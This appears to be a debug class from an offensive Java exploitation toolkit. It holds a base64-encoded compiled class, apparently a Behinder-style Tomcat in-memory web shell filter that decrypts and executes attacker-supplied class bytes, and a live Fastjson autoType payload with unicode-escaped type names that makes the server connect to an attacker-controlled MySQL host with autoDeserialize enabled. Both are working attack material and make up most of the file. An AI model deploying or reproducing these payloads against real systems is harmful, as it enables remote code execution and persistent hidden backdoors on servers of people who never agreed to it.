package com.sorry.utils;


import com.common.tools.quartz.SimpleJob;
import com.sorry.utils.bytecommon.TransforBytes;
import com.sorry.utils.bytetricks.Javassist;
import com.sorry.utils.cipher.rememberMeUtil;
import com.sorry.utils.custom.Xquartz;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.shiro.codec.Base64;
import org.apache.shiro.mgt.AbstractRememberMeManager;
import sun.misc.BASE64Decoder;

/**
 * created by 0x22cb7139 on 2021/6/24
 */
public class Debug {
    public static void main(String[] args) throws Exception {
        try{
            //String evil64="yv66vgAAADQB0QoAKwDkCgASAOUIAOYKACEA5wkAEgDoCwAMAOkKACsA6ggA6woAIQDsCgDtAO4KAO0A7wcA8AoAIQDxBwDyCADzCQD0APUKAO0A9gcBzwoAEgDkCwAMAPgIAPkIAPoLAJsA+wsAmwD8CQD9AP4KAP8BAAcBAQgBAgsAmwEDCQD0AQQHAQUIAQYHAQcKACEBCAoBCQDuBwCTCgEJAQoIAQsHAQwKACcBDQgBDggBDwcBEAgBEQoAGwESBwETBwEUCwAuARUIARYKABsBFwkAEgEYCwAuARkIARoLARsBHAgBHQoBHgEfBwEgCgAbASEKADkBIgoBHgEjBwEkCgA9AOQIASULASYBJwgBKAgBKQsALgEqBwErCgBEAOQKASwBLQoARAEuCgEeAS8HATAIATEHAL8JATIBMwoAIQE0CgBJATUKATIBNgoAIQE3CgArARcHATgLATkBOgcBOwgBPAcA2AoAVAE9CAE+CgAbAT8IAUAIAUEIAUIHAUMIAUQIAUUKACEBRggBRwoAIQE9CAFICAFJBwFKCgBlAUsKAGUBTAgAyQgBTQgBTggBTwgA1AgBUAoBUQFSCgAbAVMKAVEBVAcBVQoBUQFWCgBxAVcKAHEBWAoAGwFZCAFaCAFbCQASAVwKABsBXQcBXgEAA3B3ZAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABHBhdGgBAApmaWx0ZXJuYW1lAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHZhcjQBABJMamF2YS9sYW5nL09iamVjdDsBAAR2YXIzAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEABXZhcjE2AQAVTGphdmEvbGFuZy9UaHJvd2FibGU7AQAFdmFyMTUBAAV2YXIxMwEABXZhcjE0AQAEdmFyNgEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAEdmFyNwEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAEdmFyOAEABHZhcjkBABNbTGphdmEvbGFuZy9PYmplY3Q7AQAFdmFyMTABAAV2YXIxMQEAAUkBAAV2YXIxMgEABXZhcjE4AQA2TGF0dGFjay9wYXlsb2Fkcy9tZW1zaGVsbC9iYXNpYy90b21jYXQvQmVoaW5kZXJGaWx0ZXI7AQAEdmFyNQcBYAEAB0R5bmFtaWMBAAxJbm5lckNsYXNzZXMBACpMamF2YXgvc2VydmxldC9GaWx0ZXJSZWdpc3RyYXRpb24kRHluYW1pYzsBAAR2YXIxAQAEdmFyMgEABHZhcjABAB5MamF2YXgvc2VydmxldC9TZXJ2bGV0Q29udGV4dDsBAAV2YXIxNwEABHRoaXMBAA1TdGFja01hcFRhYmxlBwHPBwDwBwEHBwEQBwFhBwFgBwFiBwEMBwEBAQAEaW5pdAEAHyhMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7KVYBAAxmaWx0ZXJDb25maWcBABxMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7AQAKRXhjZXB0aW9ucwcBYwEACGRvRmlsdGVyAQBbKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspVgEAAWsBAAFjAQAVTGphdmF4L2NyeXB0by9DaXBoZXI7AQALcGFnZUNvbnRleHQBAA9MamF2YS91dGlsL01hcDsBAAJiZgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEADmV2aWxDbGFzc0J5dGVzAQACW0IBAAtkZWZpbmVjbGFzcwEABWNsYXp6AQABYQEADnNlcnZsZXRSZXF1ZXN0AQAeTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAPc2VydmxldFJlc3BvbnNlAQAfTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwEAC2ZpbHRlckNoYWluAQAbTGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47AQADcmVxAQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQADcnNwAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEAFkxvY2FsVmFyaWFibGVUeXBlVGFibGUBADVMamF2YS91dGlsL01hcDxMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL09iamVjdDs+OwcBEwcBFAcBOAcBZAEAB2Rlc3Ryb3kBABFnZXRTZXJ2bGV0Q29udGV4dAEAICgpTGphdmF4L3NlcnZsZXQvU2VydmxldENvbnRleHQ7AQAgTGphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbjsBABVMamF2YS91dGlsL0FycmF5TGlzdDsBABNbTGphdmEvbGFuZy9UaHJlYWQ7BwFDBwFKAQADbWQ1AQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAFtAQAdTGphdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdDsBAAFzAQADcmV0AQAIPGNsaW5pdD4BAApTb3VyY2VGaWxlAQATQmVoaW5kZXJGaWx0ZXIuamF2YQwAfwCADADUANUBAChvcmcuYXBhY2hlLmNhdGFsaW5hLmNvcmUuU3RhbmRhcmRDb250ZXh0DAFlAWYMAH4AfAwBZwFoDAFpAWoBAAdjb250ZXh0DAFrAWwHAWEMAW0BbgwBbwFwAQAcamF2YXgvc2VydmxldC9TZXJ2bGV0Q29udGV4dAwBcQFyAQAmb3JnL2FwYWNoZS9jYXRhbGluYS91dGlsL0xpZmVjeWNsZUJhc2UBAAVzdGF0ZQcBcwwBdAF1DAF2AXcBADRhdHRhY2svcGF5bG9hZHMvbWVtc2hlbGwvYmFzaWMvdG9tY2F0L0JlaGluZGVyRmlsdGVyDAF4AXkBAAhlbmNvZGluZwEABXV0Zi04DAF6AXsMAXwBbgcBfQwBfgF/BwGADAGBAYIBABBqYXZhL2xhbmcvU3RyaW5nAQACLyoMAYMBhAwBhQF1AQAob3JnL2FwYWNoZS9jYXRhbGluYS9jb3JlL1N0YW5kYXJkQ29udGV4dAEAC2ZpbHRlclN0YXJ0AQAPamF2YS9sYW5nL0NsYXNzDAGGAYcHAWIMAYgBiQEAL29yZy5hcGFjaGUudG9tY2F0LnV0aWwuZGVzY3JpcHRvci53ZWIuRmlsdGVyTWFwAQATamF2YS9sYW5nL1Rocm93YWJsZQwBigCAAQAkb3JnLmFwYWNoZS5jYXRhbGluYS5kZXBsb3kuRmlsdGVyTWFwAQAOZmluZEZpbHRlck1hcHMBABBqYXZhL2xhbmcvT2JqZWN0AQANZ2V0RmlsdGVyTmFtZQwBiwGMAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlDAGGAY0BAARQT1NUDAGOAY8MAHsAfAwBkAGRAQABdQcBkgwBkwGUAQADQUVTBwGVDAGWAZcBAB9qYXZheC9jcnlwdG8vc3BlYy9TZWNyZXRLZXlTcGVjDAGYAZkMAH8BmgwArwGbAQARamF2YS91dGlsL0hhc2hNYXABAAdzZXNzaW9uBwGcDAGdAZ4BAAdyZXF1ZXN0AQAIcmVzcG9uc2UMAZ8BoAEAFnN1bi9taXNjL0JBU0U2NERlY29kZXIHAaEMAaIBjQwBowGkDAGlAaYBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBAAtkZWZpbmVDbGFzcwcBpwwBqACQDAGpAYcMAaoBqwwBrAGtDAGuAa8BABNqYXZhL2xhbmcvRXhjZXB0aW9uBwGwDAC1AbEBABBqYXZhL2xhbmcvVGhyZWFkAQAKZ2V0VGhyZWFkcwwBsgGNAQAEaHR0cAwBswG0AQAIQWNjZXB0b3IBAAZ0YXJnZXQBAAhlbmRwb2ludAEAHmphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbgEABnRoaXMkMAEAB2hhbmRsZXIMAbUBagEABmdsb2JhbAEAIm9yZy5hcGFjaGUuY295b3RlLlJlcXVlc3RHcm91cEluZm8BAApwcm9jZXNzb3JzAQATamF2YS91dGlsL0FycmF5TGlzdAwBtgG3DAFvAbgBAAdnZXROb3RlAQAJZ2V0SGVhZGVyAQAQQWNjZXB0LUxhbmd1YWdlcwEAA01ENQcBuQwBlgG6DAG7AbcMAbwBvQEAFGphdmEvbWF0aC9CaWdJbnRlZ2VyDAG+AZkMAH8BvwwBwAHBDAHCAcMBABBmNWQ3YWEzYmE0OTI5Y2MxAQABLwwAfQB8DAHCAcEBABRqYXZheC9zZXJ2bGV0L0ZpbHRlcgcBxAEAKGphdmF4L3NlcnZsZXQvRmlsdGVyUmVnaXN0cmF0aW9uJER5bmFtaWMBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEAFWdldEZpbHRlclJlZ2lzdHJhdGlvbgEANihMamF2YS9sYW5nL1N0cmluZzspTGphdmF4L3NlcnZsZXQvRmlsdGVyUmVnaXN0cmF0aW9uOwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAQaXNBc3NpZ25hYmxlRnJvbQEAFChMamF2YS9sYW5nL0NsYXNzOylaAQAib3JnL2FwYWNoZS9jYXRhbGluYS9MaWZlY3ljbGVTdGF0ZQEADVNUQVJUSU5HX1BSRVABACRMb3JnL2FwYWNoZS9jYXRhbGluYS9MaWZlY3ljbGVTdGF0ZTsBAANzZXQBACcoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KVYBAAlhZGRGaWx0ZXIBAFQoTGphdmEvbGFuZy9TdHJpbmc7TGphdmF4L3NlcnZsZXQvRmlsdGVyOylMamF2YXgvc2VydmxldC9GaWx0ZXJSZWdpc3RyYXRpb24kRHluYW1pYzsBABBzZXRJbml0UGFyYW1ldGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nOylaAQARc2V0QXN5bmNTdXBwb3J0ZWQBABxqYXZheC9zZXJ2bGV0L0Rpc3BhdGNoZXJUeXBlAQAHUkVRVUVTVAEAHkxqYXZheC9zZXJ2bGV0L0Rpc3BhdGNoZXJUeXBlOwEAEWphdmEvdXRpbC9FbnVtU2V0AQACb2YBACUoTGphdmEvbGFuZy9FbnVtOylMamF2YS91dGlsL0VudW1TZXQ7AQAYYWRkTWFwcGluZ0ZvclVybFBhdHRlcm5zAQAqKExqYXZhL3V0aWwvRW51bVNldDtaW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAHU1RBUlRFRAEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAA9wcmludFN0YWNrVHJhY2UBABBlcXVhbHNJZ25vcmVDYXNlAQAVKExqYXZhL2xhbmcvU3RyaW5nOylaAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBAApnZXRTZXNzaW9uAQAiKClMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbgEADHNldEF0dHJpYnV0ZQEAJyhMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL09iamVjdDspVgEAE2phdmF4L2NyeXB0by9DaXBoZXIBAAtnZXRJbnN0YW5jZQEAKShMamF2YS9sYW5nL1N0cmluZzspTGphdmF4L2NyeXB0by9DaXBoZXI7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYBABcoSUxqYXZhL3NlY3VyaXR5L0tleTspVgEADWphdmEvdXRpbC9NYXABAANwdXQBADgoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEACWdldFJlYWRlcgEAGigpTGphdmEvaW8vQnVmZmVyZWRSZWFkZXI7AQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEACHJlYWRMaW5lAQAMZGVjb2RlQnVmZmVyAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAB2RvRmluYWwBAAYoW0IpW0IBABFqYXZhL2xhbmcvSW50ZWdlcgEABFRZUEUBABFnZXREZWNsYXJlZE1ldGhvZAEAFGdldFN5c3RlbUNsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAB3ZhbHVlT2YBABYoSSlMamF2YS9s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";
            //TransforBytes.CreateFileFromBytes(Base64.decode(evil64),"custom.class");
            String payload_mysqljdbc = "{\"aaa\":{\"@type\":\"\\u006a\\u0061\\u0076\\u0061.lang.AutoCloseable\", \"@type\":\"\\u0063\\u006f\\u006d.mysql.jdbc.JDBC4Connection\",\"hostToConnectTo\":\"192.168.33.128\",\"portToConnectTo\":3306,\"url\":\"jdbc:mysql://192.168.33.128:3306/test?detectCustomCollations=true&autoDeserialize=true&user=\",\"databaseToConnectTo\":\"test\",\"info\":{\"@type\":\"\\u006a\\u0061\\u0076\\u0061.util.Properties\",\"PORT\":\"3306\",\"statementInterceptors\":\"\\u0063\\u006f\\u006d.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\",\"autoDeserialize\":\"true\",\"user\":\"cb\",\"PORT.1\":\"3306\",\"HOST.1\":\"172.20.64.40\",\"NUM_HOSTS\":\"1\",\"HOST\":\"172.20.64.40\",\"DBNAME\":\"test\"}}\n" + "}";
            System.out.println(payload_mysqljdbc);
        }
        catch (Exception e){
            e.printStackTrace();
        }
    }
}
